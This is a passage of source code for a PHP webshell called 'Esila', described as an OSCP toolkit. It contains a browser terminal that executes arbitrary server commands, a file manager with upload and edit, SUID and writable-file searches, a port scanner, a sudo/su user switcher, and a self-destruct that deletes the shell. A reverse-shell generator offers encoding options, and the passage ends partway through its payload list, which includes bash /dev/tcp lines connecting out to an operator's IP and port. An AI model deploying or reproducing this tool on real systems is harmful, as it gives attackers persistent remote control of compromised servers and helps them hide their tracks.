#term-input { flex:1; background:transparent; border:none; outline:none; color:#e6edf3; font-family:var(--font-mono); font-size:14px; caret-color:#007AFF; padding:0; margin:0; }

/* Scrollable panel content */
.panel-body { flex:1; overflow-y:auto; padding:20px; }
.grid-2 { display:grid; grid-template-columns:repeat(auto-fill,minmax(280px,1fr)); gap:16px; }
.grid-3 { display:grid; grid-template-columns:repeat(auto-fill,minmax(200px,1fr)); gap:12px; }

/* Info cards */
.info-card { background:var(--surface); border:1px solid var(--border); border-radius:var(--radius); padding:16px; transition:all .25s ease; box-shadow:0 2px 8px rgba(0,0,0,0.15); }
.info-card:hover { border-color:var(--border-hover); transform:translateY(-2px); box-shadow:0 8px 24px rgba(0,0,0,0.25); }
.info-card .label { font-size:12px; color:var(--text-secondary); margin-bottom:4px; text-transform:uppercase; letter-spacing:0.5px; }
.info-card .value { font-size:14px; font-family:var(--font-mono); word-break:break-all; }

/* File manager */
.fm-breadcrumb { display:flex; align-items:center; gap:4px; font-size:13px; flex-wrap:wrap; }
.fm-breadcrumb span { color:var(--accent); cursor:pointer; padding:2px 4px; border-radius:4px; }
.fm-breadcrumb span:hover { background:rgba(0,122,255,0.1); }
.fm-table { width:100%; border-collapse:collapse; font-size:13px; }
.fm-table th { text-align:left; padding:8px 12px; color:var(--text-secondary); font-weight:500; border-bottom:1px solid var(--border); position:sticky; top:0; background:var(--bg); }
.fm-table td { padding:8px 12px; border-bottom:1px solid rgba(255,255,255,0.04); }
.fm-table tr:hover td { background:rgba(255,255,255,0.03); }
.fm-table .fname { cursor:pointer; color:var(--text); display:flex; align-items:center; gap:8px; }
.fm-table .fname:hover { color:var(--accent); }
.fm-table .dir-icon { color:var(--accent); }
.fm-table .file-icon { color:var(--text-secondary); }
.fm-actions { display:flex; gap:4px; }

/* GTFOBins */
.gtfo-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(180px,1fr)); gap:10px; }
.gtfo-card { background:var(--surface); border:1px solid var(--border); border-left:3px solid var(--green); border-radius:var(--radius-sm); padding:12px; cursor:pointer; transition:all .25s ease; box-shadow:0 2px 8px rgba(0,0,0,0.15); }
.gtfo-card:hover { border-color:var(--accent); border-left-color:var(--accent); transform:translateY(-2px); box-shadow:0 6px 20px rgba(0,0,0,0.25); }
.gtfo-card[data-has-suid] { border-left-color:var(--red); }
.gtfo-card[data-has-sudo] { border-left-color:var(--orange); }
.gtfo-card[data-has-revshell] { border-left-color:var(--accent); }
.gtfo-card.expanded { grid-column:1/-1; cursor:default; }
.gtfo-card .bin-name { font-family:var(--font-mono); font-size:14px; font-weight:600; margin-bottom:6px; }
.gtfo-card .badges { display:flex; flex-wrap:wrap; gap:4px; }
.gtfo-detail { margin-top:12px; }
.gtfo-detail h4 { font-size:13px; margin:12px 0 6px; color:var(--text-secondary); }

/* Reverse shell */
.rs-list { display:flex; flex-direction:column; gap:6px; max-height:calc(100vh - 340px); overflow-y:auto; }
.rs-item { padding:10px 14px; background:var(--surface); border:1px solid var(--border); border-radius:var(--radius-sm); cursor:pointer; transition:all .2s; display:flex; justify-content:space-between; align-items:center; }
.rs-item:hover { border-color:var(--accent); }
.rs-item.selected { border-color:var(--accent); background:rgba(0,122,255,0.08); box-shadow:0 0 12px rgba(0,122,255,0.15); animation:glowPulse 2s ease infinite; }
.rs-item .rs-name { font-size:13px; font-weight:500; }
.rs-item .rs-lang { font-size:11px; color:var(--text-secondary); }

/* Network output */
.net-output { background:#010409; border:1px solid var(--border); border-radius:var(--radius-sm); padding:14px; font-family:var(--font-mono); font-size:13px; white-space:pre-wrap; min-height:200px; max-height:60vh; overflow-y:auto; color:var(--green); }

/* Dropzone */
.dropzone { border:2px dashed var(--border); border-radius:var(--radius); padding:40px 20px; text-align:center; color:var(--text-secondary); transition:all .2s; cursor:pointer; }
.dropzone:hover, .dropzone.dragover { border-color:var(--accent); color:var(--accent); background:rgba(0,122,255,0.05); }

/* Modal */
.modal-overlay { position:fixed; inset:0; background:rgba(0,0,0,0.6); backdrop-filter:blur(4px); z-index:1000; display:none; align-items:center; justify-content:center; }
.modal-overlay.show { display:flex; }
.modal { background:var(--surface-solid); border:1px solid var(--border); border-radius:16px; padding:24px; max-width:600px; width:90%; max-height:80vh; overflow-y:auto; }
.modal h3 { margin-bottom:16px; }
.modal textarea { width:100%; min-height:300px; background:#010409; border:1px solid var(--border); border-radius:var(--radius-sm); padding:12px; color:var(--text); font-family:var(--font-mono); font-size:13px; resize:vertical; outline:none; }
.modal textarea:focus { border-color:var(--accent); }

/* Toast */
.toast { position:fixed; bottom:20px; right:20px; padding:10px 18px; background:var(--surface-solid); border:1px solid var(--border); border-radius:var(--radius-sm); font-size:13px; z-index:2000; transform:translateY(100px); opacity:0; transition:all .3s ease; }
.toast.show { transform:translateY(0); opacity:1; }
.toast.success { border-color:var(--green); color:var(--green); }
.toast.error { border-color:var(--red); color:var(--red); }

/* Responsive */
@media(max-width:768px) {
    .sidebar { position:fixed; left:0; top:0; bottom:0; transform:translateX(-100%); z-index:200; }
    .sidebar.mobile-open { transform:translateX(0); }
    .sidebar.collapsed { width:var(--sidebar-width); }
    .mobile-hamburger { display:flex !important; }
    .grid-2 { grid-template-columns:1fr; }
}
.mobile-hamburger { display:none; background:none; border:none; color:var(--text); padding:8px; cursor:pointer; }
.mobile-hamburger svg { width:22px; height:22px; }
.mobile-overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.5); z-index:150; }
.mobile-overlay.show { display:block; }
</style>
</head>
<body>
<div class="app">

<!-- Top bar -->
<div class="topbar">
    <span class="tb-accent"><?= htmlspecialchars($username) ?>@<?= htmlspecialchars($hostname) ?></span>
    <span class="tb-path" id="tb-path"><?= htmlspecialchars($cwd) ?></span>
    <span class="spacer"></span>
    <span style="color:var(--green);font-size:11px">PHP <?= phpversion() ?></span>
    <span class="clock" id="clock"></span>
</div>

<div class="app-body">

<!-- Mobile overlay -->
<div class="mobile-overlay" id="mobileOverlay" onclick="toggleMobileSidebar()"></div>

<!-- Sidebar -->
<nav class="sidebar" id="sidebar">
    <div class="sidebar-header">
        <div><div class="logo">Esila</div><div class="ver">v<?= VERSION ?> &middot; <?= htmlspecialchars($username) ?>@<?= htmlspecialchars($hostname) ?></div></div>
        <button class="toggle-btn" onclick="toggleSidebar()" title="Toggle sidebar"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12h18M3 6h18M3 18h18"/></svg></button>
    </div>
    <div class="nav">
        <div class="nav-item active" data-panel="terminal" onclick="switchPanel('terminal')">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
            <span class="nav-label">Terminal</span>
        </div>
        <div class="nav-item" data-panel="revshell" onclick="switchPanel('revshell')">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 3H5a2 2 0 00-2 2v4m6-6h10a2 2 0 012 2v4M9 3v18m0 0h10a2 2 0 002-2V5M9 21H5a2 2 0 01-2-2V5"/></svg>
            <span class="nav-label">Reverse Shells</span>
        </div>
        <div class="nav-item" data-panel="gtfobins" onclick="switchPanel('gtfobins')">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 20h9M16.5 3.5a2.12 2.12 0 013 3L7 19l-4 1 1-4z"/></svg>
            <span class="nav-label">GTFOBins</span>
        </div>
        <div class="nav-item" data-panel="filemanager" onclick="switchPanel('filemanager')">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
            <span class="nav-label">File Manager</span>
        </div>
        <div class="nav-item" data-panel="sysinfo" onclick="switchPanel('sysinfo')">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
            <span class="nav-label">System Info</span>
        </div>
        <div class="nav-item" data-panel="nettools" onclick="switchPanel('nettools')">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg>
            <span class="nav-label">Network Tools</span>
        </div>
        <div class="nav-item" data-panel="settings" onclick="switchPanel('settings')">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 00.33 1.82l.06.06a2 2 0 010 2.83 2 2 0 01-2.83 0l-.06-.06a1.65 1.65 0 00-1.82-.33 1.65 1.65 0 00-1 1.51V21a2 2 0 01-4 0v-.09A1.65 1.65 0 009 19.4a1.65 1.65 0 00-1.82.33l-.06.06a2 2 0 01-2.83-2.83l.06-.06A1.65 1.65 0 004.68 15a1.65 1.65 0 00-1.51-1H3a2 2 0 010-4h.09A1.65 1.65 0 004.6 9a1.65 1.65 0 00-.33-1.82l-.06-.06a2 2 0 012.83-2.83l.06.06A1.65 1.65 0 009 4.68a1.65 1.65 0 001-1.51V3a2 2 0 014 0v.09a1.65 1.65 0 001 1.51 1.65 1.65 0 001.82-.33l.06-.06a2 2 0 012.83 2.83l-.06.06A1.65 1.65 0 0019.4 9a1.65 1.65 0 001.51 1H21a2 2 0 010 4h-.09a1.65 1.65 0 00-1.51 1z"/></svg>
            <span class="nav-label">Settings</span>
        </div>
    </div>
    <div class="sidebar-footer">
        <div class="user-info"><div class="user-dot"></div><span><?= htmlspecialchars($username) ?>@<?= htmlspecialchars($hostname) ?></span></div>
    </div>
</nav>

<!-- Main content -->
<div class="main">

<!-- ========== TERMINAL ========== -->
<div class="panel active" id="panel-terminal">
    <div class="panel-header">
        <button class="mobile-hamburger" onclick="toggleMobileSidebar()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12h18M3 6h18M3 18h18"/></svg></button>
        <span class="panel-title">Terminal</span>
        <span style="font-size:12px;color:var(--text-dim);font-family:var(--font-mono)"><?= htmlspecialchars($username) ?>@<?= htmlspecialchars($hostname) ?>:<?= htmlspecialchars($cwd) ?></span>
        <div class="spacer"></div>
        <button class="btn btn-sm" onclick="termClear()">Clear</button>
    </div>
    <div id="terminal-container">
        <div id="term-output" onclick="document.getElementById('term-input').focus()"></div>
        <div id="term-input-line">
            <span class="prompt-static"><span class="prompt-user"><?= htmlspecialchars($username) ?></span>@<span class="prompt-host"><?= htmlspecialchars($hostname) ?></span>:<span class="prompt-path" id="term-prompt-path"><?= htmlspecialchars($cwd) ?></span>$ </span>
            <input type="text" id="term-input" autofocus autocomplete="off" spellcheck="false">
        </div>
    </div>
</div>

<!-- ========== REVERSE SHELLS ========== -->
<div class="panel" id="panel-revshell">
    <div class="panel-header">
        <button class="mobile-hamburger" onclick="toggleMobileSidebar()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12h18M3 6h18M3 18h18"/></svg></button>
        <span class="panel-title">Reverse Shell Generator</span>
        <div class="spacer"></div>
        <label style="font-size:13px;color:var(--text-secondary)">IP</label>
        <?php
        $_ip = '';
        if (!IS_WIN) {
            $_ip = trim(esila_exec("hostname -I 2>/dev/null | awk '{print \$1}'"));
            if (!$_ip) $_ip = trim(esila_exec("ifconfig 2>/dev/null | grep -oP 'inet \\K[\\d.]+' | grep -v '127.0.0.1' | head -1"));
        } else {
            $_ip = trim(esila_exec("powershell -c \"(Get-NetIPAddress -AddressFamily IPv4 | Where-Object { \$_.IPAddress -ne '127.0.0.1' } | Select-Object -First 1).IPAddress\" 2>nul"));
        }
        if (!$_ip || $_ip === '127.0.0.1') $_ip = @gethostbyname(@gethostname());
        if (!$_ip || $_ip === gethostname()) $_ip = '10.10.10.10';
        ?>
        <input class="input input-sm" id="rs-ip" value="<?= htmlspecialchars($_ip) ?>" style="width:130px">
        <label style="font-size:13px;color:var(--text-secondary)">Port</label>
        <input class="input input-sm" id="rs-port" value="4444" style="width:70px">
        <label style="font-size:13px;color:var(--text-secondary)">Shell</label>
        <select class="input input-sm" id="rs-shell">
            <option>/bin/bash</option><option>/bin/sh</option><option>bash</option><option>sh</option><option>cmd</option><option>powershell</option>
        </select>
    </div>
    <div style="border-bottom:1px solid var(--border);padding:8px 20px;display:flex;gap:8px;flex-wrap:wrap;align-items:center;background:var(--surface)">
        <div class="tabs" id="rs-tabs">
            <div class="tab active" onclick="switchRsTab('reverse')">Reverse Shell</div>
            <div class="tab" onclick="switchRsTab('bind')">Bind Shell</div>
            <div class="tab" onclick="switchRsTab('msfvenom')">MSFVenom</div>
            <div class="tab" onclick="switchRsTab('listeners')">Listeners</div>
        </div>
        <div class="spacer"></div>
        <input class="input input-sm" id="rs-search" placeholder="Filter..." style="width:160px" oninput="filterShells()">
        <label style="font-size:12px;color:var(--text-secondary);display:flex;align-items:center;gap:4px">
            <input type="checkbox" id="rs-urlencode" onchange="renderPayload()">URL
        </label>
        <label style="font-size:12px;color:var(--text-secondary);display:flex;align-items:center;gap:4px">
            <input type="checkbox" id="rs-b64" onchange="renderPayload()">Base64
        </label>
    </div>
    <div class="panel-body" style="display:flex;gap:16px;padding:16px">
        <div style="flex:1;min-width:0">
            <div class="rs-list" id="rs-list"></div>
        </div>
        <div style="width:45%;flex-shrink:0;display:flex;flex-direction:column;gap:12px">
            <div style="font-size:13px;color:var(--text-secondary)" id="rs-selected-name">Select a payload...</div>
            <div class="code-box" id="rs-output" style="flex:1;min-height:120px"><span style="color:var(--text-dim)">Payload will appear here</span></div>
            <div style="display:flex;gap:8px">
                <button class="btn btn-primary btn-sm" onclick="copyPayload()">Copy</button>
                <button class="btn btn-sm" onclick="sendPayloadToTerm()">Send to Terminal</button>
            </div>
        </div>
    </div>
</div>

<!-- ========== GTFOBins ========== -->
<div class="panel" id="panel-gtfobins">
    <div class="panel-header">
        <button class="mobile-hamburger" onclick="toggleMobileSidebar()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12h18M3 6h18M3 18h18"/></svg></button>
        <span class="panel-title">GTFOBins Reference</span>
        <div class="spacer"></div>
        <input class="input input-sm" id="gtfo-search" placeholder="Search binaries..." style="width:180px" oninput="filterGtfo()">
    </div>
    <div style="border-bottom:1px solid var(--border);padding:8px 20px;display:flex;gap:6px;flex-wrap:wrap;background:var(--surface)">
        <button class="btn btn-sm gtfo-filter active" data-cat="all" onclick="setGtfoFilter('all',this)">All</button>
        <button class="btn btn-sm gtfo-filter" data-cat="shell" onclick="setGtfoFilter('shell',this)">Shell</button>
        <button class="btn btn-sm gtfo-filter" data-cat="suid" onclick="setGtfoFilter('suid',this)">SUID</button>
        <button class="btn btn-sm gtfo-filter" data-cat="sudo" onclick="setGtfoFilter('sudo',this)">Sudo</button>
        <button class="btn btn-sm gtfo-filter" data-cat="capabilities" onclick="setGtfoFilter('capabilities',this)">Capabilities</button>
        <button class="btn btn-sm gtfo-filter" data-cat="file-read" onclick="setGtfoFilter('file-read',this)">File Read</button>
        <button class="btn btn-sm gtfo-filter" data-cat="file-write" onclick="setGtfoFilter('file-write',this)">File Write</button>
        <button class="btn btn-sm gtfo-filter" data-cat="reverse-shell" onclick="setGtfoFilter('reverse-shell',this)">Reverse Shell</button>
    </div>
    <div class="panel-body">
        <div class="gtfo-grid" id="gtfo-grid"></div>
    </div>
</div>

<!-- ========== FILE MANAGER ========== -->
<div class="panel" id="panel-filemanager">
    <div class="panel-header">
        <button class="mobile-hamburger" onclick="toggleMobileSidebar()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12h18M3 6h18M3 18h18"/></svg></button>
        <span class="panel-title">File Manager</span>
        <div class="spacer"></div>
        <div class="fm-breadcrumb" id="fm-breadcrumb"></div>
        <div class="spacer"></div>
        <button class="btn btn-sm" onclick="fmMkdir()">New Folder</button>
        <button class="btn btn-sm btn-primary" onclick="document.getElementById('fm-upload-input').click()">Upload</button>
        <input type="file" id="fm-upload-input" style="display:none" onchange="fmUpload(this.files[0])">
    </div>
    <div class="panel-body" style="padding:0">
        <div id="fm-dropzone" class="dropzone" style="margin:16px;display:none" ondragover="event.preventDefault();this.classList.add('dragover')" ondragleave="this.classList.remove('dragover')" ondrop="event.preventDefault();this.classList.remove('dragover');fmUpload(event.dataTransfer.files[0])">
            Drop file here to upload
        </div>
        <div style="overflow-x:auto">
            <table class="fm-table" id="fm-table">
                <thead><tr><th>Name</th><th>Size</th><th>Permissions</th><th>Modified</th><th>Actions</th></tr></thead>
                <tbody id="fm-tbody"></tbody>
            </table>
        </div>
    </div>
</div>

<!-- ========== SYSTEM INFO ========== -->
<div class="panel" id="panel-sysinfo">
    <div class="panel-header">
        <button class="mobile-hamburger" onclick="toggleMobileSidebar()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12h18M3 6h18M3 18h18"/></svg></button>
        <span class="panel-title">System Information</span>
        <div class="spacer"></div>
        <button class="btn btn-sm" onclick="loadSysinfo()">Refresh</button>
        <button class="btn btn-sm" onclick="findSuid()">Find SUID</button>
        <button class="btn btn-sm" onclick="findWritable()">Find Writable</button>
    </div>
    <div class="panel-body" id="sysinfo-body">
        <p style="color:var(--text-secondary)">Click Refresh to load system information...</p>
    </div>
</div>

<!-- ========== NETWORK TOOLS ========== -->
<div class="panel" id="panel-nettools">
    <div class="panel-header">
        <button class="mobile-hamburger" onclick="toggleMobileSidebar()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12h18M3 6h18M3 18h18"/></svg></button>
        <span class="panel-title">Network Tools</span>
        <div class="spacer"></div>
        <input class="input input-sm" id="net-target" placeholder="Target IP or hostname" style="width:200px">
        <button class="btn btn-sm" onclick="runNet('ping')">Ping</button>
        <button class="btn btn-sm" onclick="runNet('portscan')">Port Scan</button>
        <button class="btn btn-sm" onclick="runNet('traceroute')">Traceroute</button>
        <button class="btn btn-sm" onclick="runNet('dns')">DNS</button>
        <button class="btn btn-sm" onclick="runNet('arp')">ARP</button>
        <button class="btn btn-sm" onclick="runNet('curl')">cURL Headers</button>
    </div>
    <div class="panel-body">
        <div class="net-output" id="net-output">Results will appear here...</div>
    </div>
</div>

<!-- ========== SETTINGS ========== -->
<div class="panel" id="panel-settings">
    <div class="panel-header">
        <button class="mobile-hamburger" onclick="toggleMobileSidebar()"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12h18M3 6h18M3 18h18"/></svg></button>
        <span class="panel-title">Settings & Danger Zone</span>
    </div>
    <div class="panel-body">
        <div class="grid-2">
            <div class="card">
                <h3 style="margin-bottom:16px">Session</h3>
                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">Current working directory:</p>
                <p style="font-family:var(--font-mono);font-size:13px;margin-bottom:16px"><?= htmlspecialchars($cwd) ?></p>
                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">PHP version: <?= phpversion() ?></p>
                <a href="?logout" class="btn btn-danger" style="text-decoration:none;display:inline-block;margin-top:8px">Logout</a>
            </div>
            <div class="card" style="border-color:rgba(0,122,255,0.3)">
                <h3 style="margin-bottom:16px;color:#007AFF">Switch User</h3>
                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">Execute commands as another user. Uses sudo/su on Linux, PowerShell credentials on Windows.</p>
                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:4px">Current: <span id="su-current" style="color:var(--green);font-weight:600"><?= htmlspecialchars(isset($_SESSION['su_user']) && $_SESSION['su_user'] ? $_SESSION['su_user'] : trim(esila_exec(IS_WIN ? 'whoami 2>nul' : 'whoami 2>/dev/null'))) ?></span></p>
                <div style="display:flex;flex-direction:column;gap:8px;margin-top:12px">
                    <input class="input input-sm" id="su-username" type="text" placeholder="Username" autocomplete="off">
                    <input class="input input-sm" id="su-password" type="password" placeholder="Password" autocomplete="off">
                    <div style="display:flex;gap:8px">
                        <button class="btn btn-primary btn-sm" onclick="doSwitchUser()">Switch User</button>
                        <button class="btn btn-sm" onclick="doResetUser()">Reset to Default</button>
                    </div>
                    <p id="su-status" style="font-size:12px;color:var(--text-secondary);margin:0"></p>
                </div>
            </div>
            <div class="card">
                <h3 style="margin-bottom:16px">Environment</h3>
                <?php
                $disabled = array_map('trim', explode(',', @ini_get('disable_functions')));
                $exec_methods = array('shell_exec','exec','system','passthru','proc_open','popen');
                $available_exec = array();
                foreach ($exec_methods as $fn) {
                    if (function_exists($fn) && !in_array($fn, $disabled)) $available_exec[] = $fn;
                }
                ?>
                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:4px">OS: <span style="color:var(--text)"><?= IS_WIN ? 'Windows' : 'Linux/Unix' ?> (<?= PHP_OS ?>)</span></p>
                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:4px">PHP: <span style="color:var(--text)"><?= phpversion() ?></span></p>
                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:4px">Server: <span style="color:var(--text)"><?= htmlspecialchars(isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'unknown') ?></span></p>
                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:4px">Exec methods: <span style="color:<?= count($available_exec) ? 'var(--green)' : 'var(--red)' ?>"><?= count($available_exec) ? implode(', ', $available_exec) : 'NONE AVAILABLE' ?></span></p>
                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:4px">Terminal: <span style="color:var(--text)" id="env-terminal-mode">Checking...</span></p>
                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:4px">Disabled functions: <span style="color:var(--orange);font-size:11px"><?= htmlspecialchars(ini_get('disable_functions') ?: 'none') ?></span></p>
            </div>
            <div class="card" style="border-color:rgba(248,81,73,0.3)">
                <h3 style="margin-bottom:16px;color:var(--red)">Danger Zone</h3>
                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">Self-destruct: delete this webshell after a delay.</p>
                <div style="display:flex;gap:8px;align-items:center">
                    <input class="input input-sm" id="sd-minutes" type="number" min="1" max="1440" value="10" style="width:80px">
                    <span style="font-size:13px;color:var(--text-secondary)">minutes</span>
                    <button class="btn btn-danger btn-sm" onclick="selfDestruct()">Activate Self-Destruct</button>
                </div>
            </div>
        </div>
    </div>
</div>

</div><!-- /main -->
</div><!-- /app-body -->
</div><!-- /app -->

<!-- Edit modal -->
<div class="modal-overlay" id="edit-modal">
    <div class="modal">
        <h3 id="edit-modal-title">Edit File</h3>
        <textarea id="edit-content"></textarea>
        <div style="display:flex;gap:8px;margin-top:12px;justify-content:flex-end">
            <button class="btn" onclick="closeEditModal()">Cancel</button>
            <button class="btn btn-primary" onclick="saveEdit()">Save</button>
        </div>
    </div>
</div>

<!-- Toast -->
<div class="toast" id="toast"></div>

<script>
// ===== GLOBALS =====
const USERNAME = <?= json_encode($username) ?>;
const HOSTNAME = <?= json_encode($hostname) ?>;
const HOME = <?= json_encode($home) ?>;
let CWD = <?= json_encode($cwd) ?>;
let cmdHistory = <?= json_encode($history) ?>;
let historyIdx = cmdHistory.length;
let currentLine = '';
let fmCurrentPath = CWD;
let editingFile = '';
let activeRsTab = 'reverse';
let activeGtfoFilter = 'all';
let expandedGtfo = null;

// ===== UTILITIES =====
function $(id) { return document.getElementById(id); }
function toast(msg, type='success') {
    const t = $('toast'); t.textContent = msg; t.className = 'toast show ' + type;
    setTimeout(() => t.className = 'toast', 2500);
}
function copyText(text) {
    navigator.clipboard.writeText(text).then(() => toast('Copied!')).catch(() => {
        const ta = document.createElement('textarea'); ta.value = text; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); ta.remove(); toast('Copied!');
    });
}
function esc(s) { const d = document.createElement('div'); d.textContent = s; return d.innerHTML; }
function formatBytes(b) { if (b === 0) return '0 B'; const k = 1024, s = ['B','KB','MB','GB']; const i = Math.floor(Math.log(b)/Math.log(k)); return parseFloat((b/Math.pow(k,i)).toFixed(1)) + ' ' + s[i]; }
async function api(data) {
    const fd = new FormData();
    for (const [k,v] of Object.entries(data)) fd.append(k, v);
    const r = await fetch(window.location.href, { method: 'POST', body: fd });
    return r;
}
async function apiJson(data) { return (await api(data)).json(); }
async function apiText(data) { return (await api(data)).text(); }
function formatPath(p) { return p === HOME ? '~' : ((p.startsWith(HOME + '/') || p.startsWith(HOME + '\\')) ? '~' + p.substring(HOME.length) : p); }

// ===== SIDEBAR =====
function toggleSidebar() { $('sidebar').classList.toggle('collapsed'); }
function toggleMobileSidebar() { $('sidebar').classList.toggle('mobile-open'); $('mobileOverlay').classList.toggle('show'); }

// ===== PANEL SWITCHING =====
function switchPanel(name) {
    document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    $('panel-' + name).classList.add('active');
    document.querySelector('[data-panel="' + name + '"]').classList.add('active');
    if (name === 'terminal') setTimeout(function(){ $('term-input').focus(); }, 100);
    if (name === 'filemanager') loadFileManager(fmCurrentPath);
    $('mobileOverlay').classList.remove('show');
    $('sidebar').classList.remove('mobile-open');
}

// ===== TERMINAL (pure inline, zero dependencies) =====
var termOutput = $('term-output');
var termInput = $('term-input');
var termBusy = false;
var suUser = '';

function getPromptHtml() {
    var u = suUser || USERNAME;
    return '<span class="prompt-user">' + esc(u) + '</span>@<span class="prompt-host">' + esc(HOSTNAME) + '</span>:<span class="prompt-path">' + esc(formatPath(CWD)) + '</span>$ ';
}

function updateInputPrompt() {
    var u = suUser || USERNAME;
    var ps = document.querySelector('#term-input-line .prompt-static');
    if (ps) ps.innerHTML = '<span class="prompt-user">' + esc(u) + '</span>@<span class="prompt-host">' + esc(HOSTNAME) + '</span>:<span class="prompt-path" id="term-prompt-path">' + esc(formatPath(CWD)) + '</span>$ ';
}

function termWrite(html) {
    termOutput.innerHTML += html;
    termOutput.scrollTop = termOutput.scrollHeight;
}
function termWriteLine(html) { termWrite(html + '\n'); }

// Banner
termWriteLine('<span style="color:#007AFF;font-weight:bold">  ___        _ _       </span>');
termWriteLine('<span style="color:#007AFF;font-weight:bold"> | __|  ___ (_) | __ _ </span>');
termWriteLine('<span style="color:#5856D6;font-weight:bold"> | _|  (_-&lt; | | |/ _` |</span>');
termWriteLine('<span style="color:#bc8cff;font-weight:bold"> |___| /__/ |_|_|\\__,_|</span>');
termWriteLine('<span style="color:#8b949e">  Web Terminal v<?= VERSION ?> | OSCP Toolkit</span>');
termWriteLine('');

function runCommand(cmd) {
    if (!cmd.trim()) return;
    termBusy = true;
    cmdHistory.push(cmd); historyIdx = cmdHistory.length;
    termWrite(getPromptHtml() + esc(cmd) + '\n');
    if (cmd.trim() === 'clear') { termOutput.innerHTML = ''; termBusy = false; return; }
    fetch(window.location.href, {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'cmd=' + encodeURIComponent(cmd)})
    .then(function(r){return r.text()}).then(function(out) {
        if (out.indexOf('__CWD__:') === 0) {
            CWD = out.replace('__CWD__:','').trim();
            updateInputPrompt();
        } else {
            termWrite(esc(out) + (out.endsWith('\n') ? '' : '\n'));
        }
        termBusy = false;
    }).catch(function(err) {
        termWriteLine('<span style="color:#f85149">Error: ' + esc(err.message) + '</span>');
        termBusy = false;
    });
}

termInput.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
        e.preventDefault();
        var cmd = termInput.value;
        termInput.value = '';
        runCommand(cmd);
    } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        if (historyIdx > 0) { historyIdx--; termInput.value = cmdHistory[historyIdx]; }
    } else if (e.key === 'ArrowDown') {
        e.preventDefault();
        if (historyIdx < cmdHistory.length - 1) { historyIdx++; termInput.value = cmdHistory[historyIdx]; }
        else { termInput.value = ''; historyIdx = cmdHistory.length; }
    } else if (e.key === 'Tab') {
        e.preventDefault();
        var partial = termInput.value;
        fetch(window.location.href, { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'autocomplete=' + encodeURIComponent(partial) })
        .then(function(r){return r.text()}).then(function(data) {
            var opts = data.trim().split('\n').filter(Boolean);
            var lastWord = partial.split(/\s+/).pop();
            if (opts.length === 1) {
                termInput.value = partial + opts[0].substring(lastWord.length);
            } else if (opts.length > 1) {
                termWrite(getPromptHtml() + esc(partial) + '\n');
                termWriteLine(esc(opts.join('  ')));
            }
        });
    } else if (e.key === 'c' && e.ctrlKey) {
        e.preventDefault();
        termWrite(getPromptHtml() + esc(termInput.value) + '^C\n');
        termInput.value = '';
    } else if (e.key === 'l' && e.ctrlKey) {
        e.preventDefault();
        termOutput.innerHTML = '';
    }
});

function termClear() { termOutput.innerHTML = ''; termInput.value = ''; }
function termExec(cmd) {
    switchPanel('terminal');
    runCommand(cmd);
}

// ===== REVERSE SHELL DATA =====
const RS_DATA = {
reverse: [
    {name:'Bash -i',lang:'Bash',os:'linux',cmd:'{shell} -i >& /dev/tcp/{ip}/{port} 0>&1'},
    {name:'Bash 196',lang:'Bash',os:'linux',cmd:'0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196'},
    {name:'Bash read line',lang:'Bash',os:'linux',cmd:'exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'},
    {name:'Bash 5',lang:'Bash',os:'linux',cmd:'{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5'},
